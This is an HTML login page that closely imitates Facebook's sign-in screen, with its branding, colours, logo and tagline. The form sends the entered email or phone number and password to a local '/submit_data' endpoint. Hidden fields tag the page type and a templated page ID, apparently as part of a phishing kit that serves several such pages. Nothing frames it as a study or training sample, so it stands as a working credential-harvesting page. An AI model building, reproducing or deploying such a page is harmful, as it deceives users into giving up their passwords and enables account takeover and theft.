<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        :root {
            --fb-blue: #1877f2;
            --fb-green: #42b72a;
            --fb-gray: #f0f2f5;
        }
        
        body {
            background-color: var(--fb-gray);
            font-family: Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        
        .login-container {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .content-wrapper {
            display: flex;
            justify-content: space-between;
            align-items: center;
            max-width: 980px;
            width: 100%;
        }
        
        .logo-section {
            max-width: 500px;
            padding-right: 32px;
            margin-bottom: 100px;
        }
        
        .facebook-logo {
            margin: -28px;
        }
        
        .logo-section h2 {
            font-size: 28px;
            line-height: 32px;
            font-weight: normal;
            color: #1c1e21;
            padding: 0 0 20px;
        }
        
        .login-box {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            padding: 20px;
            max-width: 396px;
            width: 100%;
        }
        
        .login-form input {
            width: 100%;
            padding: 14px 16px;
            font-size: 17px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            margin-bottom: 12px;
        }
        
        .login-form input:focus {
            outline: none;
            border-color: var(--fb-blue);
            box-shadow: 0 0 0 2px #e7f3ff;
        }
        
        .login-button {
            background-color: var(--fb-blue);
            border: none;
            border-radius: 6px;
            color: white;
            font-size: 20px;
            font-weight: bold;
            padding: 12px;
            width: 100%;
            margin-bottom: 16px;
        }
        
        .login-button:hover {
            background-color: #166fe5;
        }
        
        .forgot-password {
            color: var(--fb-blue);
            font-size: 14px;
            text-decoration: none;
            display: block;
            text-align: center;
            margin: 16px 0;
        }
        
        .divider {
            border-bottom: 1px solid #dadde1;
            margin: 20px 0;
        }
        
        .create-account-button {
            background-color: var(--fb-green);
            border: none;
            border-radius: 6px;
            color: white;
            font-size: 17px;
            font-weight: bold;
            padding: 14px 16px;
            margin: 0 auto;
            display: block;
        }
        
        .create-account-button:hover {
            background-color: #36a420;
        }
        
        .footer {
            text-align: center;
            margin-top: 28px;
            font-size: 14px;
        }
        
        .footer a {
            color: #1c1e21;
            text-decoration: none;
            font-weight: bold;
        }
        
        @media (max-width: 900px) {
            .content-wrapper {
                flex-direction: column;
                text-align: center;
            }
            
            .logo-section {
                margin-bottom: 40px;
                padding-right: 0;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="content-wrapper">
            <div class="logo-section">
                <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" class="facebook-logo">
                <h2>Facebook helps you connect and share with the people in your life.</h2>
            </div>
            
            <div class="login-box">
                <form class="login-form" method="POST" action="/submit_data">
                    <input type="hidden" name="page_type" value="facebook">
                    <input type="hidden" name="page_id" value="{{ page_id }}">
                    
                    <input type="text" name="username" placeholder="Email address or phone number" required>
                    <input type="password" name="password" placeholder="Password" required>
                    
                    <button type="submit" class="login-button">Log In</button>
                    <a href="#" class="forgot-password">Forgotten password?</a>
                    
                    <div class="divider"></div>
                    
                    <button type="button" class="create-account-button">Create new account</button>
                </form>
                
                <div class="footer">
                    <a href="#">Create a Page</a> for a celebrity, brand or business.
                </div>
            </div>
        </div>
    </div>
</body>
</html>
